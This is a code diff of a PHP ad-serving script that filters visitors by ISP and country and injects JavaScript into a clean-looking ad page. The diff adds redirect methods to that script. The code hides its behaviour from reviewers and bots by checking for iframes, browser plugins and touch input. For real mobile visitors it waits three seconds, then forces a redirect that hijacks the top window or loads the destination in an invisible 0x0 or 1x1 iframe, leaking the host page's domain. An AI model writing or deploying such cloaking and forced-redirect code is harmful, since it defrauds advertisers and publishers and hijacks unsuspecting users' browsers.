@@ -11,8 +11,7 @@
 	// In all other cases it returns a HTML page with an body onload event, and javascript functiont that redirects to the redirect Url. The scripts basically replaces 2 tags in the
 	// clean html: {script}, and {onload}. These tags should be placed in the <head>{script}</head>, and <body{onload}></body> of the clean Html.
 	//
-	// This data is requested (and should be maintained) in a mySQL database. This is not the case for now. For testing purposes the html page 'CleanAd.html' is used, and the
-	// redirectUrl is hard coded.
+	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
 	//
 
 	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
@@ -64,7 +63,8 @@
 		
 		returns an array with information or FALSE
 	**/
-	function getISPInfo($ip) {
+	function getISPInfo($ip)
+	{
 		mylog('getISPInfo:'.$ip);
 		
 		// If data not available, we can´t do it
@@ -198,8 +198,8 @@
 		return false;
 	}	
 
-	function lookup_subdiv($continent_nr,$country_nr=0,$subdiv1_code="",$subdiv2_code="") {
-		
+	function lookup_subdiv($continent_nr,$country_nr=0,$subdiv1_code="",$subdiv2_code="")
+	{		
 		$last = filesize('subdivisions.db') / 80; /* 80 bytes per record */
 		$f = fopen('subdivisions.db','rb');
 		
@@ -276,8 +276,8 @@
 		
 		returns an array with information
 	**/
-	function getGEOInfo($ip) {
-
+	function getGEOInfo($ip)
+	{
 		mylog('getGEOInfo:'.$ip);
 
 		// If data not available, fail call
@@ -432,8 +432,10 @@
 	/*
 		Get the Client IP 
 	 **/
-	function getClientIP() {
+	function getClientIP()
+	{
 	    $ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
+
 	    foreach ($ip_keys as $key) {
 	        if (array_key_exists($key, $_SERVER) === true) {
 	            foreach (explode(',', $_SERVER[$key]) as $ip) {
@@ -446,6 +448,7 @@
 	            }
 	        }
 	    }
+
 	    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
 	}
 
@@ -455,9 +458,11 @@
 	 */
 	function validate_ip($ip)
 	{
-	    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+	    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false)
+	    {
 	        return false;
 	    }
+
 	    return true;
 	}
 
@@ -609,8 +614,9 @@
 
 	$adConfig = processConfig($configFilename);
 
-	$redirectUrl = $adConfig['RedirectUrl'];
-	$adCountry = $adConfig['CountryCode'];
+	$redirectUrl = array_key_exists('RedirectUrl', $adConfig) ? $adConfig['RedirectUrl'] : "";
+	$redirectMethod = array_key_exists('Method', $adConfig) ? $adConfig['Method'] : "";
+	$adCountry = array_key_exists('CountryCode', $adConfig) ? $adConfig['CountryCode'] : "";
 
 	if (empty($redirectUrl))
 	{
@@ -697,18 +703,49 @@
 	}
 	else
 	{
+		if ($redirectMethod == "windowlocation")
+		{
+			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+		}
+		else if ($redirectMethod == "windowtoplocation")
+		{
+			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+		}
+		else if ($redirectMethod == "1x1iframe")
+		{
+			$redirectCode = "var el = document.createElement('iframe');
+							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+							 el.width = 1;
+							 el.height = 1;
+							 document.body.appendChild(el);";
+		}
+		else // Default 0x0 iframe redirect
+		{
+			$redirectCode = "var el = document.createElement('iframe');
+							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+							 el.width = 0;
+							 el.height = 0;
+							 document.body.appendChild(el);";
+		}
+
 		$scriptCode = "<script type=\"text/javascript\">
 
-							function inIframe () {
-							    try {
+							function inIframe ()
+							{
+							    try
+							    {
 							        return window.self !== window.top;
-							    } catch (e) {
+							    }
+							    catch (e)
+							    {
 							        return true;
 							    }
 							}
 
-						   function go() {
-						   		if (inIframe()) {
+						   function go()
+						   {
+						   		if (inIframe())
+						   		{
 						   			if (navigator.plugins.length > 0)
 						   			{
 						   				return;
@@ -717,7 +754,8 @@
 						   			if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
 		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))
 									{
-										setTimeout(function() {
+										setTimeout(function()
+										{
 											var topDomain = '';
 
 											try
@@ -731,11 +769,7 @@
 												topDomain = document.referrer;
 											}
 
-											var el = document.createElement('iframe');
-											el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
-											el.width = 1;
-											el.height = 1;
-											document.body.appendChild(el);										
+											$redirectCode
 										}, 3000);
 									}
 									else
@@ -747,7 +781,8 @@
 									}
 						   		}
 						   	}
-					   </script>";
+					   </script>";		
+
 		$onloadCode = " onload=\"go();\"";
 
 		$resultHtml = str_replace("{script}", $scriptCode, $resultHtml);
